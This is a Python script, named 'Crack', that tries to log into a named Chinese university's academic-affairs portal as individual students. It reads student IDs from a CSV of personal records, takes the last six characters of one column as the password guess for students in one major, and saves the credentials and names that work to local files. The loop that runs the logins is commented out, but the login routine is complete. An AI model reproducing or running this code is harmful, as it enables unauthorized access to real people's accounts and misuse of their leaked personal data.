import csv
import requests
from lxml import etree
import datetime as d
import re


class Crack:
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) \
        Chrome/71.0.3578.98 Safari/537.36"}

    def get_sign(self):
        index = self.session.get('http://jiaowu.sicau.edu.cn/web/web/web/index.asp', timeout=5)
        index.encoding = 'gb2312'
        seletor = etree.HTML(index.text)
        return seletor.xpath("//input[@name='sign']/@value")

    def log_sicau(self, student_id, password):
        t = d.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_pwd = open('./user_pwd.txt', 'a+')
        log = open('./crack_pwd.log', 'a+')
        time_out = open('./time_out.txt', 'a+')
        try:
            data = {'user': student_id, 'pwd': password, 'lb': 'S', 'submit': '', 'sign': self.get_sign()}
            try:
                post_url = 'http://jiaowu.sicau.edu.cn/jiaoshi/bangong/check.asp'
                try:
                    self.session.post(post_url, data=data, timeout=5)
                    data = self.session.get('http://jiaowu.sicau.edu.cn/xuesheng/bangong/main/index1.asp', timeout=5)
                except:
                    print(student_id, 'Connection_timed_out_2', t, file=log)
                    print(student_id, file=time_out)
                data.encoding = 'gb2312'
                name = re.compile('<td width="99" align="left">(.*)</td>').findall(data.text)
                print(student_id, password, name[1], file=user_pwd)
                print(student_id, password, name[1], t, file=log)
            except:
                print(student_id, 'wrong_password', t, file=log)
                print(student_id, file=time_out)
        except:
            print(student_id, 'Connection_timed_out_1', t, file=log)
            print(student_id, file=time_out)


if __name__ == '__main__':
    student_ID = []
    password = []
    with open('./info.csv') as f:
        reader = csv.reader(f)
        for row in reader:
            a = row[1]
            c = row[5]
            b = row[15][-6:]
            if a != '' and c == '食品科学与工程':
                print(a)
    #             student_ID.append(row[1])
    #             password.append(row[15][-6:])
    # crack = Crack()
    # n = 0
    # for i in range(len(student_ID)):
    #     crack.log_sicau(student_ID[i], password[i])
    #     n += 1
    #     print(n)

